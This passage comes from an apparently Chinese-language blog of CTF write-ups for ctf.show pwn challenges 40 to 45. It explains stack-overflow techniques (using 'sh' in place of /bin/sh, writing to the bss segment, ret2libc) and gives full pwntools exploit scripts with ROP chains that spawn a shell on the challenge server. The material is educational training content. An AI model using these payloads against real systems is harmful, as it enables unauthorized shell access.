operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"pwn.challenge.ctf.show\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">28188</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>ret<span class=\"token operator\">=</span><span class=\"token number\">0x00000000004004fe</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>rdi_ret<span class=\"token operator\">=</span><span class=\"token number\">0x00000000004007e3</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>system<span class=\"token operator\">=</span><span class=\"token number\">0x0000000000400520</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>binsh<span class=\"token operator\">=</span><span class=\"token number\">0x0000000000400808</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"ret2text&amp;&amp;64bit\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>payload1<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xa</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rdi_ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\">#这里需要考虑堆栈平衡</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"pwn41sh与binsh\"><a class=\"anchor\" href=\"#pwn41sh与binsh\">#</a> pwn41（ <code>sh</code>  与 <code>/bin/sh</code> ）</h1>\n<p>可以利用 <code>sh</code>  来代替 <code>/bin/sh</code></p>\n<ol>\n<li><code>system(&quot;/bin/sh&quot;)</code> ：在 Linux 和类 Unix 系统中， <code>/bin/sh</code>  通常是一个符号链接，指向系统默认的 shell 程序（如 Bash 或 Shell）。因此，使用 <code>system(&quot;/bin/sh&quot;)</code>  会启动指定的 shell 程序，并在新的子进程中执行。这种方式可以确保使用系统默认的 shell 程序执行命令，因为 <code>/bin/sh</code>  链接通常指向默认 shell 的可执行文件。</li>\n<li><code>system(&quot;sh&quot;)</code> ：使用 <code>system(&quot;sh&quot;)</code>  会直接启动一个名为 <code>sh</code>  的 <code>shell程序</code> ，并在新的子进程中执行。这种方式假设系统的环境变量 $PATH 已经配置了能够找到 sh 可执行文件的路径，否则可能会导致找不到 sh 而执行失败。</li>\n<li>总结来说， <code>system(&quot;/bin/sh&quot;)</code>  是直接指定了系统默认的 shell 程序路径来执行命令，而 <code>system(&quot;sh&quot;)</code>  则依赖系统的环境变量 $PATH 来查找 sh 可执行文件并执行。如果系统的环境变量设置正确，这两种方式是等效的。</li>\n</ol>\n<h2 id=\"题目-7\"><a class=\"anchor\" href=\"#题目-7\">#</a> 题目</h2>\n<p>题目描述： <code>32位的 system(); 但是没&quot;/bin/sh&quot; ，好像有其他的可以替代</code></p>\n<p>利用 <code>sh</code>  来代替 <code>/bin/sh</code></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#context.log_level = 'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#e=ELF('./')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#p=remote('node4.buuoj.cn',28249)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"pwn.challenge.ctf.show\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">28212</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>echo_falg<span class=\"token operator\">=</span><span class=\"token number\">0x80487B0</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>system<span class=\"token operator\">=</span><span class=\"token number\">0x80483D0</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">#binsh=0x8048750</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>sh<span class=\"token operator\">=</span><span class=\"token number\">0x80487BA</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"ind something to replace it!\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"    * *************************************                           \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>payload1<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x12</span><span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>sh<span class=\"token punctuation\">)</span><span class=\"token comment\">#+p32(echo_flag)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"pwn42仍然是sh\"><a class=\"anchor\" href=\"#pwn42仍然是sh\">#</a> pwn42（仍然是 sh）</h1>\n<h1 id=\"题目-8\"><a class=\"anchor\" href=\"#题目-8\">#</a> 题目</h1>\n<p>题目内容： <code>64位的 system(); 但是没&quot;/bin/sh&quot; ，好像有其他的可以替代</code></p>\n<p>仍然是 <code>sh</code>  只不过是传参方式不同</p>\n<p>exp:</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#context.log_level = 'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"pwn.challenge.ctf.show\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">28224</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>ret<span class=\"token operator\">=</span><span class=\"token number\">0x000000000040053e</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>rdi_ret<span class=\"token operator\">=</span><span class=\"token number\">0x0000000000400843</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>system<span class=\"token operator\">=</span><span class=\"token number\">0x000000000400560</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>sh<span class=\"token operator\">=</span><span class=\"token number\">0x0000000000400872</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"ind something to replace it!\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"    * *************************************                           \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>payload1<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xa</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rdi_ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>sh<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"pwn4332位bss段写入binsh\"><a class=\"anchor\" href=\"#pwn4332位bss段写入binsh\">#</a> pwn43（32 位 bss 段写入 <code>/bin/sh</code> ）</h1>\n<h2 id=\"题目-9\"><a class=\"anchor\" href=\"#题目-9\">#</a> 题目</h2>\n<p>题目内容： <code>32位的 system(); 但是好像没&quot;/bin/sh&quot; 上面的办法不行了，想想办法</code></p>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/12/piS7f8U.png\" alt=\"\" /></p>\n<p>发现有 gets 函数、system 函数，但是没有 <code>/bin/sh</code> ，那么需要我们自己输入 <code>/bin/sh</code> ，发现了 <code>bbs</code>  段上有 <code>buf2</code>  可以让我们写入 <code>/bin/sh</code>  到这个地方</p>\n<p>而我们想要写入到 bss 段，就要将这里的地址当作 gets 的参数传入，那么我们就需要通过 ret 再次执行 <code>gets</code>  并且传入他的参数为 <code>buf2</code></p>\n<p>这里我们用到寄存器传参， <code>pop_ebx_ret</code> （用 ebp 也可以，看起来和选择的是哪个寄存器关系不大），将这个地址放置在 32 位的返回地址处</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#context.log_level = 'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./pwn43')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#e=ELF('./')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#p=remote('node4.buuoj.cn',28249)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"pwn.challenge.ctf.show\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">28253</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>buf2<span class=\"token operator\">=</span><span class=\"token number\">0x804B060</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>system<span class=\"token operator\">=</span><span class=\"token number\">0x08048450</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>get<span class=\"token operator\">=</span><span class=\"token number\">0x8048420</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>pop_ebp_ret<span class=\"token operator\">=</span><span class=\"token number\">0x0804884b</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>pop_ebx_ret<span class=\"token operator\">=</span><span class=\"token number\">0x08048409</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\">#binsh=0x8048750</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>sh<span class=\"token operator\">=</span><span class=\"token number\">0x80487BA</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"How to do?           \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"    * *************************************                           \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\">#payload1=b\"a\"*(0x6c+4)+p32(get)+p32(pop_ebx_ret)+p32(buf2)+p32(system)+p32(0)+p32(buf2)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>payload2<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x6c</span><span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>get<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>pop_ebx_ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>buf2<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>pop_ebp_ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>buf2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">\"/bin/sh\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>这里 payload1 和 payload2 都可以，利用了寄存器传参并作为了返回地址</p>\n<h1 id=\"pwn4464位bss段写入binsh\"><a class=\"anchor\" href=\"#pwn4464位bss段写入binsh\">#</a> pwn44（64 位 bss 段写入 <code>/bin/sh</code> ）</h1>\n<h2 id=\"题目-10\"><a class=\"anchor\" href=\"#题目-10\">#</a> 题目：</h2>\n<p>题目内容： <code>64位的 system(); 但是好像没&quot;/bin/sh&quot; 上面的办法不行了，想想办法</code></p>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/13/pipM5N9.png\" alt=\"\" /></p>\n<p>这里可以利用寄存器（rdi）传参，先返回到 gets 函数输入 <code>/bin/sh</code>  到 bss 段，然后再调用 system 将 bss 地址传入；这个题有 puts 函数，也可以进行泄露 libc 地址来进行 getshell，不过我这里没有查找到对应的 libc 版本</p>\n<p>exp:</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#context.log_level = 'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"pwn.challenge.ctf.show\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">28297</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>buf2<span class=\"token operator\">=</span><span class=\"token number\">0x0000000000602080</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>rdi_ret<span class=\"token operator\">=</span><span class=\"token number\">0x00000000004007f3</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>system<span class=\"token operator\">=</span><span class=\"token number\">0x000000000400520</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>get<span class=\"token operator\">=</span><span class=\"token number\">0x0000000000400530</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>payload1<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xa</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rdi_ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>buf2<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>get<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rdi_ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>buf2<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">\"/bin/sh\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"pwn4532位ret2libc\"><a class=\"anchor\" href=\"#pwn4532位ret2libc\">#</a> pwn45 (32 位 ret2libc)</h1>\n<h2 id=\"题目-11\"><a class=\"anchor\" href=\"#题目-11\">#</a> 题目</h2>\n<p>题目描述： <code>32位 无 system 无 &quot;/bin/sh&quot;</code></p>\n<p>保护只开启了部分 RELRO</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/13/piptP00.png\" alt=\"\" /></p>\n<p>程序可以溢出，但是没有后门函数，那么我们可以通过泄露 libc 基地址自己构造执行 system 来 getshell</p>\n<p>exp：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'i386'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#p=process('./')</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn45'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"pwn.challenge.ctf.show\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">28154</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>puts_got<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">\"puts\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>puts_plt<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">\"puts\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>main<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">\"main\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>write_got<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">\"write\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>write_plt<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">\"write\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x6b</span><span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>write_plt<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>main<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>write_got<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"O.o?\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>write<span class=\"token operator\">=</span>u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xf7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"write:\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>write<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>libc<span class=\"token operator\">=</span>LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">\"write\"</span><span class=\"token punctuation\">,</span>write<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>libc_base<span class=\"token operator\">=</span>write<span class=\"token operator\">-</span>libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">\"write\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>system<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">\"system\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>binsh<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">\"str_bin_sh\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\">#libc_base=puts-libc.sym[\"puts\"]</span></pre></td></tr><tr><td 